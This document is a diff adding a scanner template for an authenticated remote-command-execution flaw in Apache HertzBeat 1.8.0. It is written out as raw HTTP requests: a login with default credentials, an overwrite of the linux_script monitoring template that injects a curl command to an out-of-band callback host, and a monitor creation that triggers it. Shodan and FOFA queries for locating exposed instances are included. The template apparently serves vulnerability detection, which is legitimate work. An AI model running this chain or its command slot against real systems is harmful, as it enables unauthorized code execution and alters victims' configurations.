@@ -1,0 +1,73 @@
+id: apache-hertzbeat-scriptcommand-rce
+
+info:
+  name: Apache HertzBeat 1.8.0 - Authenticated scriptCommand RCE
+  author: bretgervasoni
+  severity: critical
+  description: |
+    Apache HertzBeat 1.8.0 allows authenticated users to execute arbitrary OS commands
+    via the scriptCommand parameter of a monitoring template definition. An authenticated
+    user can overwrite the linux_script app template via PUT /api/apps/define/yml, inject
+    a shell command into scriptCommand, then trigger execution by creating a monitor.
+    Apache considers this behaviour by-design per their security model. Risk is
+    significantly elevated when default credentials (operator:hertzbeat) are in use.
+  reference:
+    - https://www.exploit-db.com/exploits/52563
+    - https://hertzbeat.apache.org/docs/help/security_model/
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    max-request: 3
+    shodan-query: 'http.title:"HertzBeat"'
+    fofa-query: 'title="HertzBeat"'
+  tags: apache,hertzbeat,rce,authenticated,edb,oob
+
+http:
+  # Step 1: Authenticate with default credentials and extract JWT
+  - raw:
+      - |
+        POST /api/account/auth/form HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"type":0,"identifier":"admin","credential":"hertzbeat"}
+
+    extractors:
+      - type: json
+        name: jwt
+        part: body
+        json:
+          - ".data.token"
+        internal: true
+
+  # Step 2: Overwrite linux_script template with OOB scriptCommand payload
+  - raw:
+      - |
+        PUT /api/apps/define/yml HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt}}
+        Content-Type: application/json
+
+        {"define":"app: linux_script\ncategory: os\nname:\n  en-US: Linux Script\n  zh-CN: Linux Script\nparams:\n  - field: host\n    name:\n      en-US: Host\n      zh-CN: Host\n    type: host\n    required: true\nmetrics:\n  - name: basic\n    i18n:\n      en-US: Basic\n      zh-CN: Basic\n    priority: 0\n    fields:\n      - field: result\n        type: 1\n        i18n:\n          en-US: Result\n          zh-CN: Result\n    protocol: script\n    script:\n      scriptTool: bash\n      charset: UTF-8\n      scriptCommand: curl http://{{interactsh-url}}\n      parseType: multiRow\n"}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":0'
+
+  # Step 3: Create monitor to trigger immediate execution
+  - raw:
+      - |
+        POST /api/monitor HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt}}
+        Content-Type: application/json
+
+        {"monitor":{"name":"rce-test","app":"linux_script","host":"127.0.0.1","intervals":30,"status":1},"params":[{"field":"host","paramValue":"127.0.0.1","type":1}]}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
